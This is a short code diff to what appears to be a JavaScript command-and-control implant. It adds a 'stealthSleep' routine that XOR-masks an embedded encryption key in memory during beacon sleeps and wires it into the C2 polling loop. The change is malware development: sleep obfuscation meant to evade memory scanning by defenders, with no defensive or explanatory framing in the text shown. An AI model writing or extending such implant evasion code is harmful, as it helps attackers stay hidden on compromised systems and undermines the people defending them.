@@ -113,6 +113,16 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+function stealthSleep(ms) {
+    const secret = Buffer.from('{{ENCRYPTION_KEY}}');
+    const key = Buffer.alloc(16);
+    for (let i = 0; i < 16; i++) key[i] = (i * 17 + (ms & 255)) & 255;
+    for (let i = 0; i < secret.length; i++) secret[i] ^= key[i % 16];
+    return sleep(ms).then(() => {
+        for (let i = 0; i < secret.length; i++) secret[i] ^= key[i % 16];
+    });
+}
+
 async function connectToC2() {
     let agentId = null;
     let pendingResults = [];
@@ -230,7 +240,7 @@ async function connectToC2() {
             if (BEACON_MODE) {
                 // Sleep with jitter
                 const sleepTime = calculateSleepTime(beaconInterval, beaconJitter) * 1000;
-                await sleep(sleepTime);
+                await stealthSleep(sleepTime);
             }
             // Long-poll mode: immediately re-poll (no sleep)
 
